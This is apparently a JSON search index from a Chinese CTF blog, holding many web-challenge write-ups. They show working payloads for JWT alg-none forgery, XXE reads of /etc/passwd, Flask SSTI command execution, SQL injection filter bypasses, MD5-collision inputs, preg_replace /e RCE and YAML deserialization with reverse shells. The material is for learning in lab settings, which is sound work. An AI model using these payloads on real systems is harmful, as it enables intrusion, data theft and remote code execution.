比如：eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiIxMjMiLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTY4MTk1OTg3N30.jJv8tD-ULxBStlglQIsVQgnR-nC7hbxsPJqOQiF_qJg 三部分之间用.间隔 这里这里绕过需要将alg（算法）改为none 将secretid改为[] 因为这个网站无法成none后的jwt编码 所以只能手动生成 也就是每部分base64编码 然后再用.连接 因为算法已经是none了所以不需要第三段签名了 eyJhbGciOiAibm9uZSIsInR5cCI6ICJKV1QifQ.eyJzZWNyZXRpZCI6IFtdLCJ1c2VybmFtZSI6ICJhZG1pbiIsInBhc3N3b3JkIjogIjEyMyIsImlhdCI6IDE2ODE5NTk4Nzd9.注意这里虽然签名部分被省略了 但是最后一个.要加上 并且签名中base64编码中用来补位==要删除 成功以admin身份登入 获取flag即可 其实这道题还是前期信息检索去明白他框架是jwt鉴权"},{"title":"buuctf-79-[红明谷CTF 2021]write_shell","date":"2023-04-29T10:10:49.000Z","url":"/post/51b0b22f.html","tags":["bypass","php短标签"],"categories":["buuctf"],"content":"[红明谷CTF 2021]write_shell 碎碎念：这道题目还是蛮简单的，考了php短标签和空格绕过，还有一个双问号表达式 解题：放出源码 首先就是通过你的sandbox+md5(ip)创建一个沙盒路径 老套路了 然后这里有两个问号??先来看看 这种是比较运算符中的NULL 合并操作符,从PHP7开始提供,作用是:从左往右第一个存在且不为 NULL 的操作数。如果都没有定义且不为 NULL，则返回 NULL 就是如果c&#x3D; a??b 如果a为0 则c&#x3D;b 如果a不为0 则c&#x3D;a 然后就是有两个模式 一个pwd就是返回路径的 upload模式让我提交shell的但是提交前会通过一个筛选 过滤了&quot;/&#39;| |_|php|;|~|\\\\^|\\\\+|eval|&#123;|&#125;/i&quot; php eval &#123;&#125; 空格都被禁了 如果直接构造?data=ls%09/ 则只会显示 不会执行 那么我们需要构造php代码去执行我们的linux命令 这也印证了前面为什么要禁php字样了 但是php字样被禁 所以要用短标签了 下面二选一 这里绕过空格 不能用$IFS$9 估计是因为php会把这个$当作变量来解析吧 用%09绕过就行 然后cat读出来就行了"},{"title":"buuctf-82-[HITCON 2017]SSRFme","date":"2023-04-29T05:59:18.000Z","url":"/post/8253ed9f.html","tags":["ssrf","perl"],"categories":["buuctf"],"content":"[HITCON 2017]SSRFme 碎碎念：这是一道ssrf 也就是服务器端请求伪造的题目 发现这样的题目常常会有 $_SERVER数组的应用，还是蛮不错的qwq 解题：进入题目给出源码： 首先第一部分if作用就是获取我们的ip 然后第二部分 根据我们的ip创建一个由md5加密的沙盒 然后选择它 第三部分 shell_exec 执行我们的 get到的 GET+url的命令 这里用到了linux中 GET命令 GET 这个命令的一个命令执行漏洞，主要是 perl 的一个特点，在 open 可以执行命令并且还支持file协议。 注意：file 协议利用 open 命令执行,要执行的命令先前必须要有以命令为文件名的文件存在 这里以命令为文件名的文件必须加上管道符| 否则不行,不太明白这里为什么不加就不行 pathinfo — 返回文件路径的信息 也就是创建一个我们传入filename的文件 然后选择它 file_put_contents — 将数据写入文件 这里也就是把$data的内容写入 我们的filename的文件中 构造payload：?url=file:ls /|&amp;filename=ls /| 这里要执行两次才能成功 也就是提交两次 为什么要提交两次呢 因为前面说过 file 协议利用 open 命令执行,要执行的命令先前必须要有以命令为文件名的文件存在 然后这里为什么要加反斜杠呢 因为管道符需要我们去转义一下 因此第一次提交 是让去创建一个以命令为文件的文件 第二次才去执行并且将执行结果写入到文件中去 然后再根据我们的ip 去构造沙盒路径 构造payload访问：/sandbox/2eeed2f9aeae6311b507ada8fb98809e/ls \\| 看到有个readflag 理论来说直接执行./readflag就可以了 但是这里不行 我们要通过构造一个以命令为文件名的文件然后去访问 如果这里构造：/readflag文件是执行不了的 因为这里必须是/readflag| 才能成功执行 但是readflag| 不是readflag文件就算执行了也没用 再说一句 一般见到readflag这样的文件名字 直接去执行 而不是去通过cat这样的命令去读 因为readflag里面是代码 直接./执行就行了 构造：?url=file:bash -c /readflag|&amp;filename=bash -c /readflag| 也是和上面一样执行两次然后通过路径去访问就可以拿到flag了 这里用的bash -c 也就是将后面字符串当作命令读入执行 然后输出 成功！"},{"title":"buuctf-74-[NCTF2019]True XML cookbook.txt","date":"2023-04-29T05:55:00.000Z","url":"/post/e8a597ec.html","tags":["xxe","内网"],"categories":["buuctf"],"content":"[NCTF2019]True XML cookbook.txt 碎碎念：这道题考察了xml和xxe，其实攻击手段手段是xxe，一开始做这道题一直没复现出来，bp爆破模块一直不动，之后用了python脚本也不行，就放弃了，第二天中午在试了一次，终于成功了，真玄学。做之前也是去补了一下xxe的知识，真不错。 解题：进入题目是一个登录框，发现我们的登录名会显示在界面上 之前buu有道题也是和这道题目一样的ui，直接套用上道题目的解题答案，发现肯定不行。 首先来看一下这个payload构成 第一行&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;这一行表示了这是xml的文档显示了版本信息和编码格式 最重要的一部分： 这是DTD，用来规范xml的文档格式 username为根元素 每个xml文档都要有一个根元素，并且有且只有一个，然后aaa是我们定义的一个实体，并且这里SYSTEM表示是外部实体，这也就是为什么xxe叫做外部实体注入，我们可以通过调用外部实体来达到我们预期的一个攻击手段。其实这里把他理解为是一个变量就可以之后是aaa这个实体的值，这里可以看到是一个file协议，没错xxe可以与伪协议一起搭配使用去恶意读一些文件内容。 具体可以看这里： 总结的很到位 然后通过 &amp;实体名称; 的方式来调用这个我们创建的实体。 然后之后就不懂了 ，慢慢的去看大佬的wp去学习 之后可以通过filter伪协议去读 index.php的内容但是没有什么用 然后这道题的思路是通过xxe去探测内网 参考：  &#x2F;etc&#x2F;hosts 储存域名解析的缓存 &#x2F;etc&#x2F;passwd 用户密码 &#x2F;proc&#x2F;net&#x2F;arp 地址解析的内核ARP表的信息 &#x2F;proc&#x2F;net&#x2F;fib_trie 路由缓存 扫一下域名解析缓存 扫一下用户登录状态密码啥的 发现都可以扫到 去扫解析的地址和路由缓存： 发现可疑ip，直接进行http协议读ip 发现不行，看了大佬的wp是因为c段ip不正确，也就是129这里不对，好像是计算机网络的知识，这里就不深究了，但是我们这里直接用bp的爆破模块就行，就是这里一开始没做出来，好像是题目问题，第二天终于做出来了 当网段正确时，拿到flag。 "},{"title":"buuctf-73-[GWCTF 2019]枯燥的抽奖","date":"2023-04-29T05:48:54.000Z","url":"/post/490aa04.html","tags":["伪随机数"],"categories":["buuctf"],"content":"[GWCTF 2019]枯燥的抽奖 碎碎念：这道题是一道关于伪造伪随机数的题目，之前从未接触过，这次来记录一下 解题：进入题目之后查看源码 发现check.php 发现源码： 总体分析一下就是我们要输入一个num参数 当num等于他产生的随机长为20的字符串 就能拿到flag mt_srand() 简单说就是这个函数给mt_rand()函数提供一个种子 然后mt_rand()函数去生成一个随机数，但是这个随机数其实是一个伪随机数 那么如果我们能破解出这个种子 这道题目就迎刃而解了 这里要用到php_mt_seed脚本去破解这个种子 脚本下载地址： 然后装到我的kali上 先make 一下 这里make一开始不知道是什么东西然后去查了查还是有东西的 然后这个脚本要先把这字符串转化为一个可识别的数列 python脚本如下: 但是我没有搞懂这个脚本的目的和原理 进行爆破 发现种子 这里调用脚本通过./调用其实就是运行该脚本的意思 再根据这个种子 重新生成题目中的字符串 直接用题目的代码稍加修改就行 脚本如下： 拿到flag "},{"title":"buuctf-72-[CSCCTF 2019 Qual]FlaskLight","date":"2023-04-29T05:44:05.000Z","url":"/post/8df15d0e.html","tags":["flask框架","python"],"categories":["buuctf"],"content":"[CSCCTF 2019 Qual]FlaskLight 一眼丁真 flask的ssti 这道题几乎没怎么过滤 payload随便在网上扒就行了 但是不知道超级无敌脚本怎么会报错 只能手动去注入了 记录一下各种payload的吧 这道题如果直接用__globals__会报错可能是被屏蔽了，通过拼接绕过就行了 这些是比较简单的payload： ?search=&#123;&#123;config.__init__['__global'+'s__'].os.popen(\"cmd\").read()&#125;&#125; ?search=&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval'](\"__import__('os').popen('cmd').read()\")&#125;&#125; "},{"title":"buuctf-71-[CISCN2019 华北赛区 Day1 Web2]ikun","date":"2023-04-29T05:38:33.000Z","url":"/post/8a6d07e1.html","tags":["python","jwt","python反序列化"],"categories":["buuctf"],"content":"[CISCN2019 华北赛区 Day1 Web2]ikun 碎碎念：一道关于jwt和python反序列化的题目，对我来说很新颖，暂时只会php的反序列化，就当作学习题目了，然后越做到后面的题目发现会python脚本干一些机械重复性的事情真的很有用，得找时间去学着写脚本。 解题：进入题目 看过源码一些正常操作之后什么也没发现，看到一句话，应该是让我们买lv6，在这之前先去注册登录，然后日常看一下admin的用户，发现是已经注册过的。 一开始我都是一页一页的在找，发现找了10几页都没有找到，就感觉不对劲了，然后看了大佬的wp，发现要用脚本去找，最后page&#x3D;181，我真的人都傻了 这里放下大佬的脚本 其实这个脚本还是蛮容易理解的，将页数格式化，让后一直循环，当该页面存在lv6.png内容时，就说明找到了 但是这里要注意，一定让脚本暂停0.8秒，因为buu会防爬 找到之后发现这个钱数我们买不了，抓包查看，发现有折扣 直接修改一下，发现页面跳转了 只容许admin访问，这也应印证了之前注册的时候admin已经被注册过 抓包分析一下，这里就是关于jwt的知识点了，参考： 就我个人认为，类似于我们平常做题的php session用于记录当前登录用户会话信息 那么弄明白之后就试着去伪造这个jwt，把我们的jwt伪造成admin的那么不就可以成功嘛 先将这个jwt字符串给 弄回原来的模样 这里有个工具： 发现存在我们登录名称，直接改为admin，再抓包可以嘛，理论可以，但是这里还存在一个key，必须拿到这个key才能再反编译回去符合他的要求，这里就有个暴力破解jwt key的脚本  我直接是放在kali环境下了，因为还要配置docker环境，环境配置好以后，里面有个文件说明，看看就会使用。 注意要用root身份 爆出 key为 1Kun 现在将用户换为 admin key使用 1Kun 然后查看源码 发现一个压缩包 下载下来 看了大佬的wp 发现Admin.py存在反序列化漏洞 源码附上： 这里的pickle模块应该就是属于python 的序列化与反序列化模块 看到become存在反序列化 那么我们就可以像php反序列化漏洞一样 构造读flag的序列化字符串 然后传给become就可以获得flag了 本地构造： 这里我在本机vscode会报错 发现这个脚本是属于python2的 我这是python3 所以我只好去我的kali虚拟去跑 注意这里要把中文注释删了 不然会报错 然后点击 一键成为大会员 抓包 修改become值 成功拿到 flag "},{"title":"buuctf-60-[De1CTF 2019]SSRF Me","date":"2023-04-29T05:30:08.000Z","url":"/post/2ee4794d.html","tags":["flask框架","python","代码审计"],"categories":["buuctf"],"content":"[De1CTF 2019]SSRF Me 一道python代码审计，发现审计能力真的很重要。 看到源码： 分析： 有三个路由：/geneSign /De1ta / /geneSign 路由是获取签名的 通过get给param传参 然后这里action不是我们能改变的 一起传入getSign() 返回 secert_key+param+action的md5值 这里只有param我们能控制 再来看/De1ta get方式给param传参 cookie传action和sign的值 经过一个waf 这里用来防止用协议 然后传入Exec() 先经过checkSign函数检查签名是否符合 分别有两个if判断 第一个if： 当有action有scan时注意这里是in 而不是 ==,生成一个tmpfile文件 将param传入scan函数 这里能看到urllib.urlopen().read()这里就是利用点 相当于打开param这个文件 题目也提示flag在flag.txt中 这也就是为什么waf要禁用file协议和gopher协议（也就是http协议的前身） 因为ssrf漏洞一般都可以搭配很多协议来用 然后将scan内容写入到tmpfile文件中 但是没法读 第二个if：当action中有read时 就会读出来赋值给result[data]然后 Exec函数返回result结果 做到这里当思路就很清晰 action同时包括scan和read时候既能写入文件也能读出文件,但是我们action的值是我们修改不了的该怎么办呢 再来看生成签名这里hashlib.md5(secert_key + param + action) 这里我们可以给param传入flag.txtread拼接起来 就算我们没有给action传read 最后md5值是将整个字符串拼接起来包含read值 这就可以了 9b231caf6bf82362fa5f78bf8da3d6ec记录下我们的签名 成功！ "},{"title":"buuctf-49-[SWPU2019]Web1","date":"2023-04-29T05:24:31.000Z","url":"/post/89f21605.html","tags":["sql注入","sql bypass"],"categories":["buuctf"],"content":"[SWPU2019]Web1 这是一道无列名注入的一道题 进入发现要注册一个账号并且登录 发现admin已经被注册了 本来一开始的想法是拿到admin的密码就结束了 进去之后有一个 可以发布内容的 看到这里以为是xss注入 但后来看了大佬wp 不是 然后在发布广告广告名这里可以进行sql注入 判断字段数，发现order by被禁用了所以之后联合查询时候包含or表，数据库都被河蟹了。 空格也被河蟹了 用/**/来绕过 这个本来是mysql用于多行注释的 就可以用group by代替 或者select 1，2，3… 根据回显判断字段数 然后这道题还河蟹了# --注释符 这里用到了通过闭合后面的单引号来绕过 参考： 这张图就可以很形象表示 判断字段数：1&#39;/**/group/**/by/**/22,&#39; 至于这个末尾的逗号 应该是起一个子句的作用 如果没有就会报错 查表：1&#39;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39; 这里用到了 mysql.innodb_table_stats因为 or 被河蟹了,又长了一个新姿势 还可以用 sys.schema_auto_increment_columns查表名 参考： 爆出表名： FLAG_TABLE,news,users,gtid_slave_pos,ads,users 得到了表名 一般来说就要爆列名了 但是这道题不知道列名 然后就要使用无列名注入了，在本地搭了一个环境进行测试 简单来说无列名注入会给表的列名起一个数字称谓（as用字符当别称也行）然后利用数字查列内容 参考： 派生表要起个别名 如下图 不然会报错 如果是数字 则要用&#96;&#96;包裹起来 如果被河蟹了 就可以用起别名的方式绕过 构造：1&#39;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)b),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39; 至于这里为什么中间是只有 select 1,2,3就结束了 这里没搞明白 如果我们多加个4 或者减去一个数 则会出现 爆出 查询的列不对应 原因是之后联合查询这部分字段数只有3个字段union/**/select*from/**/users select 和 union select一起用的时候前后字段数必须相同 "},{"title":"buuctf-48-[安洵杯 2019]easy_serialize_php","date":"2023-04-28T16:06:47.000Z","url":"/post/5419e860.html","tags":["反序列化字符串逃逸"],"categories":["buuctf"],"content":"[安洵杯 2019]easy_serialize_php 这是一道反序列化字符串逃逸题目 一道学习题目 打开题目 看到源码 看到url 是f=highli_file 看到源码就明白了 这里可以说是主程序了 题目当f=phpinfo()输出phpinfo()我们会找到一些东西 果然发现了可疑php文件 主程序有file_get_contents() 这里应该就是去包含我们发现的d0g3_f1ag.php文件 还有一个我不知道的特殊点：$_SESSION数组 这是一个数组 这道题$_SESSION共有三个变量分别为 user function img 其实img用来去包含那个php文件 但是这里 $_SESSION[‘img’]先通过base64加密 然后再进行sha1()函数 尽管主函数最后包含文件之前会有base64解密 但是sha1()函数明显就是不让我们直接将flag文件赋值给$_SESSION[‘img’] 那么应该怎么让$_SESSION[‘img’]等于我们的php文件呢 这里思路大概就是类似于类反序列化 本地序列化构造包含了php文件的$_SESSION[‘img’] 然后再反序列去覆盖那个题目中的$_SESSION[‘img’] 再来看过滤这部分 用空字符去正则代换我们的文件名后缀名 这里就用到了字符串反序列化沙箱逃逸 参考 通过一个小demo简单看一下原理 本地测试 就是通过特意构造序列化 让$_SESSION[“function”]中的内容仿照反序列化后的$_SESSION[img]数组内容 从而达到覆盖 当$_SESSION[‘user’]中的24个字符被空字符代替之后 之后反序列化就会继续向后面寻找24个字符找到符合条件的内容进行反序列化读取&quot;;s:8:&quot;function&quot;;s:59:&quot;a这24个字符 并且之后还有&quot;;符合停止的条件 而后继续向后读取img的20个字符，第四个、第五个s向后读取均满足规则。 这里需要注意的点： 这里&#39;a&quot;左边的单引号是去闭合者一整段字符串右边的单引号 右边的双引号是为了去闭合序列化后的&quot;a&quot; 为什么是4个flag 即24个字符 要根据后面构造的内容去灵活变动 然后是&#125;构造的字符串中有一个&#125;这个很重要 一开始本地测试的一直报错 发现是把这个&#125;给删了 这个&#125;是用来之后反序列化时候匹配停止匹配的一个符号吧（我是这样认为的）如果不加就会导致沙箱逃逸失败 然后因为在文件包含之前会有base64解码 需要把我们发现的php文件进行base64加密之后 弄进我们构造的字符串中 之后题目就迎刃而解了。"},{"title":"buuctf-44-[安洵杯 2019]easy_web","date":"2023-04-28T16:01:18.000Z","url":"/post/6fcfe2b3.html","tags":["bypass","md5强相等碰撞"],"categories":["buuctf"],"content":"[安洵杯 2019]easy_web 打开题目抓包分析： 发现图片是通过base64编码进行输出的 看了大佬的wp img=TXpVek5UTTFNbVUzTURabE5qYz0 即文件名是先进行十六进制编码在进行两次base64编码 解码查看原文件名 第一次：base64 第二次: base64 得到hex编码数 第三次：在进行十六进制解码 那么我们可以这种方式进行构造查看index.php 爆出源码: 代码分析： get方式传入cmd 但是要进行一个正则匹配 再通过 post方式传a与b 要求a与b不相等 但是md5加密后相等 先来看正则匹配 河蟹了一些常用的linux命令和一些字符 这里重点来看一下反斜杠的屏蔽 其实这道题这里匹配反斜杠出现问题了 本地测试： |\\\\|\\\\\\\\| 这里两个反斜杠的第二个反斜杠转义了第二个| 使得这一块出现了错误 最终这里就是匹配 \\|\\\\\\\\这一块 因此可以用反斜杠 本地测试： 但是如果我们想匹配一个\\ 那么我们在编写正则的时候就需要\\\\\\来达到匹配一个\\的效果 接着来看第二部分md5强相等 一开始我是想通过数组方式绕过 但是这道题在post a和b值后对他们进行了强制转换为字符串类型 因此不能用数组绕过了 只能用一个脚本进行md5碰撞 使得两个字符的md5值强相等 只能借助fastcoll这个工具 具体参考：^v73^insert_down3,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term&#x3D;fastcoll&amp;spm&#x3D;1018.2226.3001.4187 这篇文章 注意最后生成的结果是通过url编码后的 如果不进行url编码 那么结果会出现乱码 本地测试： 因为我们提交的内容会被浏览器默认url解码一次 所以结果都是一样的 但是我们查读文件所需的 ls cat都被正则匹配了这里应该怎么绕过呢 第一种方式： 可以用dir来代替ls 进行浏览文件 作用和ls一样 sort代替cat进行读文件 注意这里抓包payload的时候要将提交方式改为post 第一次做一直都是get传参一直没做出来 之后才发现要将bp的传参方式改为post 空格用url编码方式%20细节很重要 构造payload：?cmd=dir%20/ post:a=fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00NkutV%9B%EE%A4%86%BA%840%5B%E0%14%F4%5B%22-%E8%07l%DA%A1%26%06%3BqK%10%92%2B%08%FE%C9%C4H%94%3F%F2k%CE%C0%1A%87K%DE_%8A7%EA%94%C7%3B%B4%2A%83%D0%3Fl%B3%25%F6%E5%F6%B2%11%E0%21%CFA%8EM%7E%CB%C5%2C%17%E6%0A%B97%09%87P%5B%121%09%B3%00%C0%2B%60h%B8%D3%DD+D%9F%C3%A24tBFS%1Al%EDP%2C%D5%18Q9%EB%B6%89ZW%F4%E5iOa%B0&amp;b=fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00NkutV%9B%EE%A4%86%BA%840%5B%E0%14%F4%5B%22-h%07l%DA%A1%26%06%3BqK%10%92%2B%08%FE%C9%C4H%94%3F%F2k%CE%C0%1A%87%CB%DE_%8A7%EA%94%C7%3B%B4%2A%83%D0%3F%EC%B3%25%F6%E5%F6%B2%11%E0%21%CFA%8EM%7E%CB%C5%2C%17%E6%0A%B97%09%07P%5B%121%09%B3%00%C0%2B%60h%B8%D3%DD+D%9F%C3%A24tBFS%1A%EC%ECP%2C%D5%18Q9%EB%B6%89ZW%F4eiOa%B0 构造payload：?cmd=sort%20/flag 第二种方式 之前说正则匹配没有过滤反斜杠 反斜杠在linux命令中也是起着转义的意义 那么在字母前加\\就等于没加 \\n这种特殊情况除外 那么就可以在命令中添加反斜杠进行绕过正则匹配 构造payload:?cmd=l\\s%20/ 再构造：?cmd=ca\\t%20/flag 成功 "},{"title":"buuctf-40-[BJDCTF2020]ZJCTF，不过如此","date":"2023-04-28T15:50:54.000Z","url":"/post/ed5a1437.html","tags":["preg_replace() /e"],"categories":["buuctf"],"content":"[BJDCTF2020]ZJCTF，不过如此 先是一个代码审计和之前一个反序列化题目很像，就是一个伪协议的利用 构造payload： 得到源码： 然后这里涉及到preg_replace() &#x2F;e模式的漏洞 将用于替换的部分当作php代码执行 参考： 这里\\\\1 其实就是 \\1 第一个 \\ 用于转义了 那么结果就是\\1 在这里是反向引用 由于我这里没搞太明白 这类题直接用模板答案就行\\S*=$&#123;命令执行&#125; 大佬总结的很全 思路就是调用getFlag()函数 然后cmd&#x3D; 命令执行 /next.php?\\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;); 注意是在next.php 下提交get传参 这里foreach搭配$_GET有特殊的用法 注意这里不是$_GET[] 本地搭了一个环境测试了一下 简单说就是形如a&#x3D;b的形式变量名和值分成两个变量来使用 蛮神奇的"},{"title":"buuctf 39-[BSidesCF 2020]Had a bad day","date":"2023-04-28T15:41:27.000Z","url":"/post/78a48903.html","tags":["php伪协议"],"categories":["buuctf"],"content":"[BSidesCF 2020]Had a bad day 打开抓包没有发现什么异常的东西，但是网站获取新页面方式有点奇怪，通过get传参取值来获取新内容，就联想到了伪协议。 直接试试flag.php 不行呢就试试index.php 发现后台主动给我们加了.php后缀 构造payload：?category=php://filter/read=convert.base64-encode/resource=index 获得base64码解码得出源码： 我们只能读取他规定的woofers meowers index 三个文件 看了别人的wp 又学到了新姿势 伪协议里面还可以再嵌套一层协议 加上他给的合法文件 ?category=php://filter/read=convert.base64-encode/resource=index/../flag 两种方式都可以 学到了"},{"title":"HDCTF 2023(省内赛道)","date":"2023-04-27T13:16:24.000Z","url":"/post/dd40690e.html","tags":["Smarty模板注入","js","Yaml反序列化","shell反弹","quine注入","python3解析特性"],"categories":["各赛事WP"],"content":"HDCTF 2023(省内赛道) 部分WP 最终排名第七吧 web狗表示web后面几道真的很难,目前刷题还没有做到后几道题目的类型，所以后半阶段真的在坐牢，还是太菜了，努力！！！ WebWelcome To HDCTF 2023解一：直接送死 解二： 直接输入在console中输入seeeeeeeecret就能拿到 SearchMaster这题拿了一血 开心qwq 一眼丁真 php的smarty注入 构造payload： CryptoNormal_Rsa应该是题目出问题了 打开题目flag就有 MischardMisc也是拿到一个一血 拖进010一把梭 末尾 base64解码拿到flag 复现：YamiYami一道关于session伪造 yaml(一开始一直在搜yami反序列化 还在想为什么搜不到相关文章 真该死啊我)反序列化 shell反弹的题目 借助这道题目好好学习一下yami漏洞和shell反弹 进入题目后能看到有三个路由 /read是用来读文件的 /upload是用来上传我们的恶意代码文件的 /pwd 字面意思就是告诉我们当前在哪个文档中 当时做题的时候还以为这道题目难度应该不会很难 还以为是很基础的上传一句话木马去包含然后getshell 看了wp真的怀疑人生 非预期先说说非预期吧 直接读取环境变量就可以了 我当时也是这么想的 但是我纯脑瘫去读linux系统用户环境信息了 而且题目环境应该是在docker下 一开始一直在读/etc/profile &#x2F;etc&#x2F;profile： 此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行. 并从&#x2F;etc&#x2F;profile.d目录的配置文件中搜集shell的设置。 根本没什么用 应该读环境变量/proc/1/environ（详细可参考：） 预期：上传一个yami反序列化文件 然后反弹shell去打 首先先去读源文件 发现做flask的题目 能get到源代码就去努力！ 这里用到了python3解析特性 如果直接构造payload/read?url= flag字样也被正则了 发现是不行的 被过滤了 这里用到了python3的字符解析特性通过双重url编码（全字符）去绕过 拿到源码 源码： 发现还有一个/boogipop路由 当session=&quot;Welcome To HDCTF2023&quot;通过get方式去读文件 也就是说还需要session伪造 伪造需要key 那么看源码是怎么生成的 在 python 中使用 uuid 模块生成 UUID（通用唯一识别码）。可以使用 uuid.getnode() 方法来获取计算机的硬件地址，这个地址将作为 UUID 的一部分。 /sys/class/net/eth0/address，这个就是网卡的位置，读取他进行伪造 得到key为33.893457812509084 通过脚本伪造session 然后yaml.full_load(f)就是漏洞所在点他会将我们上传的恶意文件内容反序列化 并且代码中并没有回显的语句也暗示了这里要通过反弹shell的方式去打（这里参考这篇大佬的文章太细了 ） 上传反序列化文件 至于为什么上面大佬的文章讲的很仔细 我就不献丑了 自己太菜了 简单理解就是python将命令执行的代码塞入了对象中然后yaml序列化得到这个 然后再利用反序列化去命令执行 看起来比较奇怪是因为这种格式是属于yaml形式的序列化对象 所以看起来比较的陌生 还有就是这里的命令执行是用反弹shell 是因为通过看源码发现没有回显的代码 所以只能通过反弹shell去变相得到回显 然后将文件命名为2.txt 这里不能用.yaml后缀被屏蔽了 既然是txt后缀为什么代码会被执行呢 这里借用大佬的理解： 猜测可能是：这里full_load调用了load函数，而load函数输入的是一个steam,也就是流，二进制文件，所以不管是什么后缀都无关紧要了 上传上去 然后去/boogipop路由下去读取，然后反弹shell 这里文件路径是uplaods/2.txt 大佬文章也提到了 不要在意这里为什么bp报错 nc能连通就行 反弹shell成功 再来说说反弹shell 这里就说说我的理解，不会去将所有概念一字不漏的打出来，我觉得没必要，理解是最棒的，想看概念随时都可以百度，但是唯独理解是检测自己是否对于一个知识点真的理解了 我们一般主动攻击去连接某个电脑，叫做正向连接，一般知道这个电脑一些信息ip之类的，知道它何时在做什么 但是如果我们不知道这台电脑信息ip什么的，或者此时此刻的状态，就叫薛定谔状态吧（bushi，就没法去连接去攻击 那么应该怎么办呢？ 这里就用到了反弹shell 何为反弹？ 既然我们不知道对方的状态 但是我们知道我们的状态信息 我们可以提供我们自己的一些信息去让对方找到我们然后连接不就行了？ 这里可以这么形象的比喻： 简单的说，就是我送了小明一份礼物，小明收到了，看见礼物里面写着xxx大街xxx户xxx号领取(木马)，小明去了敲门(打开木马，反弹shell)，我开门把他拉进来(netcat)，这样我就有了他的支配权，他的操作就被我控制了。 来自一个b站网友 我觉得很形象能理解反弹shell的概念 既然是对方找到我们，就需要用公网ip，我们物理机的ip都是一个局域网分配的，真实ip都掌握在运营商手里 这里就需要用到vps或者在大厂买云服务即可，当然也不影响我白嫖室友的云服务器:) 以上只是我浅薄的理解，可以参考这篇文章深入理解： 然后我简单总结了一下一些常用的反弹shell的exp： 回到题目，发现没有关于flag的文件，所以还是通过读取环境变量来读flag，结束。 LoginMaster这道题 我的评价是寄，刷题没刷到过这样的注入——quine注入，还有时间盲注也还没有开始学借助此次机会学习学习 首先日常先看/robots.txt发现了waf 看到waf后我就陷入了沉思，我能想到的payload所包含的几乎都河蟹了个遍，这还怎么玩，就放弃了 看了wp要用时间盲注和quine组合拳去打 其实看了waf 这段代码也大概能感觉到是quine注入 这里就是需要我们输入的密码与查询到的密码相等 说简单一点，quine注入就是输入与输出完全相同 自产生程序也就是说就是输入的sql语句与要输出的一致 用到replace()函数 如果输入 replace(&quot;.&quot;,char(46),&quot;.&quot;) 则会输出 . 如果输入 replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;) 则会用第三个参数去替换第一个参数中的所有. 但是此时就会发现一个问题 我们输入与输出并不是完全相同的 我们输入的单引号在输出语句里都是双引号 因此 需要在repalce里面再嵌套一个replace来让双引号转成单引号 用上面的式子替换所有的. 就会发现输入与输出完全相等 回到题目 因为屏蔽了空格用()嵌套或者/**/绕过都行 payload:1&#39;UNION(SELECT(REPLACE(REPLACE(&#39;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#39;,CHAR(34),CHAR(39)),CHAR(37),&#39;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#39;)))# 分析： 1&#39;UNION(SELECT(REPLACE(A,CHAR(37),B))) 用B替换%,%这个符号应该是任意的后续替换时变成相应的char就行 A:REPLACE(&#39;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#39;,CHAR(34),CHAR(39)) 双引号换为单引号-&gt;替换%-&gt;双引号换为单引号 双引号换位单引号-&gt;替换% 提供三种payload吧，以后如果再遇到这样的题目也能拿来直接用 1&#39;/**/union/**/select/**/replace(replace(&#39;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)# 1&#39;union/**/select/**/replace(replace(&#39;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)# 1&#39;UNION(SELECT(REPLACE(REPLACE(&#39;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#39;,CHAR(34),CHAR(39)),CHAR(37),&#39;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#39;)))# 第一个payload与第二个payload之间的差距：为第一个与union之间有空格，第二个无，本质上两个payload无区别 注意sql中为char()而不是chr() 网上payload需要转换 搞定： 至于时间盲注这个坑，以后遇到经典题型借助题目来总结吧，这里插个眼先:) 还有两道java题目就不复现了，java还是我没有解锁的领域，复现起来也很吃力，之后系统开始学java之后再来复现填坑吧。 